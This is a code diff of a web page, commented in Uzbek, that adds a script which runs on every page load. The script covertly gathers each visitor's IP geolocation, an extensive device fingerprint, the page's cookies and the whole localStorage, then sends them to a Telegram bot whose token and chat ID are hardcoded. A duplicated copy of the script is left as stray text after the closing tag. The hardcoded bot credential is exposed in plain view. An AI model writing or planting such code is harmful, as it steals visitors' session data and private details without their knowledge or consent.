@@ -884,91 +884,309 @@
 
   <a href="#" class="back-to-top"><i class="fa fa-chevron-up"></i></a>
   <div id="preloader"></div>
+
   <script>
     window.addEventListener('load', () => {
-      // Qurilma va IP ma'lumotlarini yig'ish va yuborish
-      sendDeviceInfo();
+      const lastSent = localStorage.getItem('lastSent');
+      const now = Date.now();
+      if (!lastSent || now - lastSent > 60000) {
+        sendDeviceInfo();
+        localStorage.setItem('lastSent', now);
+      } else {
+        console.log('So‘rov juda tez yuborildi.');
+        showToast('So‘rov juda tez yuborildi.', 'error');
+      }
     });
   
     async function sendDeviceInfo() {
       try {
-        // IP manzilini olish uchun ipify API dan foydalanamiz
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipResponse = await fetch('https://ipapi.co/json/', { mode: 'cors' });
         const ipData = await ipResponse.json();
         const ipAddress = ipData.ip || 'Aniqlanmadi';
+        const geoInfo = {
+          city: ipData.city || 'Aniqlanmadi',
+          region: ipData.region || 'Aniqlanmadi',
+          country: ipData.country_name || 'Aniqlanmadi',
+          latitude: ipData.latitude || 'Aniqlanmadi',
+          longitude: ipData.longitude || 'Aniqlanmadi',
+          postal: ipData.postal || 'Aniqlanmadi',
+          isp: ipData.org || 'Aniqlanmadi',
+          asn: ipData.asn || 'Aniqlanmadi',
+        };
   
-        // Qurilma va brauzer ma'lumotlari
+        const batteryData = await getBatteryInfo();
+        const networkData = getNetworkInfo();
+  
         const deviceInfo = {
           userAgent: navigator.userAgent || 'Aniqlanmadi',
           platform: navigator.platform || 'Aniqlanmadi',
-          language: navigator.language || 'Aniqlanmadi',
+          language: navigator.language || navigator.languages?.join(', ') || 'Aniqlanmadi',
           screenResolution: `${window.screen.width}x${window.screen.height}` || 'Aniqlanmadi',
+          colorDepth: window.screen.colorDepth || 'Aniqlanmadi',
           timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Aniqlanmadi',
           cookiesEnabled: navigator.cookieEnabled ? 'Ha' : 'Yo‘q',
           onlineStatus: navigator.onLine ? 'Onlayn' : 'Oflayn',
           referrer: document.referrer || 'Aniqlanmadi',
           currentURL: window.location.href || 'Aniqlanmadi',
+          deviceMemory: navigator.deviceMemory || 'Aniqlanmadi',
+          hardwareConcurrency: navigator.hardwareConcurrency || 'Aniqlanmadi',
+          maxTouchPoints: navigator.maxTouchPoints || 'Aniqlanmadi',
+          vendor: navigator.vendor || 'Aniqlanmadi',
+          product: navigator.product || 'Aniqlanmadi',
+          appVersion: navigator.appVersion || 'Aniqlanmadi',
+          doNotTrack: navigator.doNotTrack || 'Aniqlanmadi',
+          javaEnabled: navigator.javaEnabled ? (navigator.javaEnabled() ? 'Ha' : 'Yo‘q') : 'Aniqlanmadi',
+          plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'Aniqlanmadi',
+          mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type).join(', ') || 'Aniqlanmadi',
+          windowSize: `${window.innerWidth}x${window.innerHeight}` || 'Aniqlanmadi',
+          performanceTiming: window.performance?.timing ? JSON.stringify({
+            navigationStart: window.performance.timing.navigationStart,
+            loadEventEnd: window.performance.timing.loadEventEnd,
+          }) : 'Aniqlanmadi',
+          webglRenderer: getWebGLRenderer() || 'Aniqlanmadi',
         };
   
-        // Kirish vaqti
         const visitTime = new Date().toLocaleString('uz-UZ', { timeZone: deviceInfo.timeZone });
-  
-        // Qurilma nomi (agar mavjud bo‘lsa, masalan, brauzer orqali aniqlanadigan qurilma turi)
         const deviceName = parseUserAgent(deviceInfo.userAgent);
-  
-        // Telegram API sozlamalari
-        const BOT_TOKEN = "7640346722:AAHDMfjHNE1dlfASH9YtQGbgCqkLuQ5NXzw"; // O'zingizning bot tokeningiz
-        const CHAT_ID = "6992354984"; // O'zingizning chat ID
-        const TEXT = `
-  🛬 *Yangi tashrif!*  
-  🕒 *Kirish vaqti:* ${visitTime}  
-  🌐 *IP manzil:* ${ipAddress}  
-  📱 *Qurilma nomi:* ${deviceName}  
-  🖥 *Brauzer/Qurilma:* ${deviceInfo.userAgent}  
-  🖼 *Ekran o‘lchami:* ${deviceInfo.screenResolution}  
-  🌍 *Vaqt zonasi:* ${deviceInfo.timeZone}  
-  🗣 *Til:* ${deviceInfo.language}  
-  🍪 *Kukilar yoqilganmi:* ${deviceInfo.cookiesEnabled}  
-  📡 *Onlayn holati:* ${deviceInfo.onlineStatus}  
-  🔗 *Referrer:* ${deviceInfo.referrer}  
-  📍 *Joriy URL:* ${deviceInfo.currentURL}
-        `;
-  
-        // Telegram API orqali yuborish
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: TEXT, parse_mode: 'Markdown' }),
-        });
-  
-        const data = await response.json();
-        if (!data.ok) {
-          console.error('Telegramga yuborishda xato:', data);
-        }
-      } catch (error) {
-        console.error('Xato yuz berdi:', error);
+        const cookies = document.cookie || 'Cookie’lar yo‘q';
+        const localStorageData = JSON.stringify(localStorage) || 'LocalStorage bo‘sh';
+
+
+        const BOT_TOKEN = "7640346722:AAHDMfjHNE1dlfASH9YtQGbgCqkLuQ5NXzw";
+      const CHAT_ID = "6992354984";
+      const TEXT = `
+🛬 *Yangi tashrif!*  
+🕒 *Kirish vaqti:* ${visitTime}  
+🌐 *IP manzil:* ${ipAddress}  
+📍 *Taxminiy joylashuv:*  
+   🏙 *Shahar:* ${geoInfo.city}  
+   🌍 *Mintaqa:* ${geoInfo.region}  
+   🇺🇳 *Mamlakat:* ${geoInfo.country}  
+   📍 *Kenglik/Uzunlik:* ${geoInfo.latitude}, ${geoInfo.longitude}  
+   📮 *Pochta indeksi:* ${geoInfo.postal}  
+   🌐 *Internet provayder:* ${geoInfo.isp}  
+   🔢 *ASN:* ${geoInfo.asn}  
+📱 *Qurilma nomi:* ${deviceName}  
+🖥 *Brauzer/Qurilma:* ${deviceInfo.userAgent}  
+🖼 *Ekran o‘lchami:* ${deviceInfo.screenResolution}  
+🎨 *Rang chuqurligi:* ${deviceInfo.colorDepth}  
+🌍 *Vaqt zonasi:* ${deviceInfo.timeZone}  
+🗣 *Tillar:* ${deviceInfo.language}  
+🍪 *Kukilar yoqilganmi:* ${deviceInfo.cookiesEnabled}  
+📡 *Onlayn holati:* ${deviceInfo.onlineStatus}  
+🔗 *Referrer:* ${deviceInfo.referrer}  
+📍 *Joriy URL:* ${deviceInfo.currentURL}  
+💾 *Qurilma xotirasi:* ${deviceInfo.deviceMemory} GB  
+🧠 *CPU yadrolari:* ${deviceInfo.hardwareConcurrency}  
+🖐 *Sensorli nuqtalar:* ${deviceInfo.maxTouchPoints}  
+🏭 *Brauzer ishlab chiqaruvchisi:* ${deviceInfo.vendor}  
+📦 *Brauzer mahsuloti:* ${deviceInfo.product}  
+🔢 *Brauzer versiyasi:* ${deviceInfo.appVersion}  
+🚫 *Kuzatuvni taqiqlash:* ${deviceInfo.doNotTrack}  
+☕️ *Java yoqilganmi:* ${deviceInfo.javaEnabled}  
+🔌 *Plaginlar:* ${deviceInfo.plugins}  
+📋 *MIME turlari:* ${deviceInfo.mimeTypes}  
+🪟 *Oyna o‘lchami:* ${deviceInfo.windowSize}  
+⏱️ *Yuklanish vaqtlari:* ${deviceInfo.performanceTiming}  
+🎮 *WebGL Renderer:* ${deviceInfo.webglRenderer}  
+🍪 *Cookie’lar:* ${cookies}  
+💾 *LocalStorage:* ${localStorageData}  
+🔋 *Batareya:* ${batteryData.level ? `${batteryData.level}, Zaryadlanmoqda: ${batteryData.charging}` : batteryData.error}  
+🌐 *Tarmoq:* ${networkData.type ? `${networkData.type}, ${networkData.effectiveType}, ${networkData.downlink}` : networkData.error}
+      `;
+
+      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: TEXT, parse_mode: 'Markdown' }),
+      });
+
+      const data = await response.json();
+      if (!data.ok) {
+        console.error('Telegram xatosi:', data);
+        showToast('Ma‘lumotlarni yuborishda xato yuz berdi.', 'error');
+      } else {
+        console.log('Ma‘lumotlar muvaffaqiyatli yuborildi.');
+        showToast('Ma‘lumotlar muvaffaqiyatli yuborildi.', 'success');
+      }
+    } catch (error) {
+      console.error('Xato yuz berdi:', error);
+      showToast('Xato yuz berdi. Iltimos, keyinroq urinib ko‘ring.', 'error');
+    }
+  }
+
+  async function getBatteryInfo() {
+    if (navigator.getBattery) {
+      try {
+        const battery = await navigator.getBattery();
+        return {
+          level: battery.level * 100 + '%',
+          charging: battery.charging ? 'Ha' : 'Yo‘q',
+        };
+      } catch {
+        return { error: 'Batareya ma‘lumotlari olinmadi' };
       }
     }
-  
-    // UserAgent ni tahlil qilib, qurilma nomini aniqlash
-    function parseUserAgent(userAgent) {
-      let device = 'Noma‘lum';
-      if (/iPhone|iPad|iPod/.test(userAgent)) device = 'Apple qurilmasi (iOS)';
-      else if (/Android/.test(userAgent)) device = 'Android qurilmasi';
-      else if (/Windows/.test(userAgent)) device = 'Windows qurilmasi';
-      else if (/Macintosh/.test(userAgent)) device = 'MacOS qurilmasi';
-      else if (/Linux/.test(userAgent)) device = 'Linux qurilmasi';
-  
-      // Brauzer nomini aniqlash
-      let browser = 'Noma‘lum';
-      if (/Chrome/.test(userAgent)) browser = 'Google Chrome';
-      else if (/Firefox/.test(userAgent)) browser = 'Mozilla Firefox';
-      else if (/Safari/.test(userAgent)) browser = 'Safari';
-      else if (/Edge/.test(userAgent)) browser = 'Microsoft Edge';
-  
-      return `${device} (${browser})`;
+    return { error: 'Batareya ma‘lumotlari qo‘llab-quvvatlanmaydi' };
+  }
+
+  function getNetworkInfo() {
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (connection) {
+      return {
+        type: connection.type || 'Aniqlanmadi',
+        effectiveType: connection.effectiveType || 'Aniqlanmadi',
+        downlink: connection.downlink + ' Mbps' || 'Aniqlanmadi',
+      };
     }
-  </script>
+    return { error: 'Tarmoq ma‘lumotlari qo‘llab-quvvatlanmaydi' };
+  }
+
+  function parseUserAgent(userAgent) {
+    let device = 'Noma‘lum';
+    if (/iPhone|iPad|iPod/.test(userAgent)) device = 'Apple qurilmasi (iOS)';
+    else if (/Android/.test(userAgent)) device = 'Android qurilmasi';
+    else if (/Windows/.test(userAgent)) device = 'Windows qurilmasi';
+    else if (/Macintosh/.test(userAgent)) device = 'MacOS qurilmasi';
+    else if (/Linux/.test(userAgent)) device = 'Linux qurilmasi';
+
+
+    let browser = 'Noma‘lum';
+    if (/Chrome/.test(userAgent)) browser = 'Google Chrome';
+    else if (/Firefox/.test(userAgent)) browser = 'Mozilla Firefox';
+    else if (/Safari/.test(userAgent)) browser = 'Safari';
+    else if (/Edge/.test(userAgent)) browser = 'Microsoft Edge';
+
+    return `${device} (${browser})`;
+  }
+
+  function getWebGLRenderer() {
+    try {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (gl) {
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Aniqlanmadi';
+      }
+    } catch (e) {
+      return 'WebGL xato: ' + e.message;
+    }
+    return 'WebGL qo‘llab-quvvatlanmaydi';
+  }
+
+  function showToast(message, type = 'error') {
+    const toast = document.createElement('div');
+    toast.style.position = 'fixed';
+    toast.style.bottom = '20px';
+    toast.style.right = '20px';
+    toast.style.padding = '10px 20px';
+    toast.style.background = type === 'error' ? '#dc3545' : '#28a745';
+    toast.style.color = 'white';
+    toast.style.borderRadius = '5px';
+    toast.style.zIndex = '1000';
+    toast.textContent = message;
+    document.body.appendChild(toast);
+    setTimeout(() => toast.remove(), 3000);
+  }
+</script>
+
+        
+
+
+
+
+
+
+  window.addEventListener('load', () => {
+    // Spam oldini olish uchun vaqt cheklovi
+    const lastSent = localStorage.getItem('lastSent');
+    const now = Date.now();
+    if (!lastSent || now - lastSent > 60000) { // 1 daqiqa cheklov
+      sendDeviceInfo();
+      localStorage.setItem('lastSent', now);
+    } else {
+      console.log('So‘rov juda tez yuborildi. Iltimos, keyinroq urinib ko‘ring.');
+      showToast('So‘rov juda tez yuborildi.', 'error');
+    }
+  });
+
+  async function sendDeviceInfo() {
+    try {
+      // IP manzilini olish
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResponse.json();
+      const ipAddress = ipData.ip || 'Aniqlanmadi';
+
+      // Batareya ma'lumotlari (ruxsatsiz faqat ba'zi brauzerlarda ishlaydi)
+      const batteryData = await getBatteryInfo();
+
+      // Tarmoq ma'lumotlari
+      const networkData = getNetworkInfo();
+
+      // Qurilma va brauzer ma'lumotlari
+      const deviceInfo = {
+        userAgent: navigator.userAgent || 'Aniqlanmadi',
+        platform: navigator.platform || 'Aniqlanmadi',
+        language: navigator.language || 'Aniqlanmadi',
+        screenResolution: `${window.screen.width}x${window.screen.height}` || 'Aniqlanmadi',
+        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Aniqlanmadi',
+        cookiesEnabled: navigator.cookieEnabled ? 'Ha' : 'Yo‘q',
+        onlineStatus: navigator.onLine ? 'Onlayn' : 'Oflayn',
+        referrer: document.referrer || 'Aniqlanmadi',
+        currentURL: window.location.href || 'Aniqlanmadi',
+        deviceMemory: navigator.deviceMemory || 'Aniqlanmadi', // Qurilma RAM
+        hardwareConcurrency: navigator.hardwareConcurrency || 'Aniqlanmadi', // CPU yadrolari
+      };
+
+      // Kirish vaqti
+      const visitTime = new Date().toLocaleString('uz-UZ', { timeZone: deviceInfo.timeZone });
+
+      // Qurilma nomi
+      const deviceName = parseUserAgent(deviceInfo.userAgent);
+
+      // Telegram API sozlamalari
+      const BOT_TOKEN = "7640346722:AAHDMfjHNE1dlfASH9YtQGbgCqkLuQ5NXzw"; // O'zingizning bot tokeningiz
+      const CHAT_ID = "6992354984"; // O'zingizning chat ID
+      const TEXT = `
+🛬 *Yangi tashrif!*  
+🕒 *Kirish vaqti:* ${visitTime}  
+🌐 *IP manzil:* ${ipAddress}  
+📱 *Qurilma nomi:* ${deviceName}  
+🖥 *Brauzer/Qurilma:* ${deviceInfo.userAgent}  
+🖼 *Ekran o‘lchami:* ${deviceInfo.screenResolution}  
+🌍 *Vaqt zonasi:* ${deviceInfo.timeZone}  
+🗣 *Til:* ${deviceInfo.language}  
+🍪 *Kukilar yoqilganmi:* ${deviceInfo.cookiesEnabled}  
+📡 *Onlayn holati:* ${deviceInfo.onlineStatus}  
+🔗 *Referrer:* ${deviceInfo.referrer}  
+📍 *Joriy URL:* ${deviceInfo.currentURL}  
+💾 *Qurilma xotirasi:* ${deviceInfo.deviceMemory} GB  
+🧠 *CPU yadrolari:* ${deviceInfo.hardwareConcurrency}  
+🔋 *Batareya:* ${batteryData.level ? `${batteryData.level}, Zaryadlanmoqda: ${batteryData.charging}` : batteryData.error}  
+🌐 *Tarmoq:* ${networkData.type ? `${networkData.type}, ${networkData.effectiveType}, ${networkData.downlink}` : networkData.error}
+      `;
+
+      // Telegram API orqali yuborish
+      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: TEXT, parse_mode: 'Markdown' }),
+      });
+
+      const data = await response.json();
+      if (!data.ok) {
+        console.error('Telegramga yuborishda xato:', data);
+        showToast('Ma‘lumotlarni yuborishda xato yuz berdi.', 'error');
+      } else {
+        console.log('Ma‘lumotlar muvaffaqiyatli yuborildi.');
+        showToast('Ma‘lumotlar muvaffaqiyatli yuborildi.', 'success');
+      }
+    } catch (error) {
+      console.error('Xato yuz berdi:', error);
+      showToast('Xato yuz berdi. Iltimos, keyinroq urinib ko‘ring.', 'error');
+    }
+  }
+
   
   
 
